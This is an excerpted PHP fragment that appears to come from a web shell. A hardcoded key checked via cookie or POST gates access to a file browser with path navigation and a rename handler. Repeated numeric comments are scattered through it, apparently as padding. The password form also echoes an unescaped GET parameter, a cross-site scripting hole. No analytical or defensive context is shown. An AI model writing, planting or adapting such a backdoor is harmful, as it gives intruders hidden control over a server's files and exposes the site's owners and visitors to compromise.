...
$auth_key = "742c49cf71f0dc4e62d6090027980720";
...
$pass = false;
if (isset($_COOKIE['pw_name_81872'])) {
    if(($_COOKIE['pw_name_81872']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_81872'])) {
        if(($_POST['pw_name_81872']) == $auth_key) {
            setcookie("pw_name_81872", $_POST['pw_name_81872']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_81872' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1727649853134845 1727649853459311 1727649853393657 1727649853130292
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1727649853134845 1727649853459311 1727649853393657 1727649853130292
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1727649853134845 1727649853459311 1727649853393657 1727649853130292
            $name = PATH . "/" . $_GET['r'];
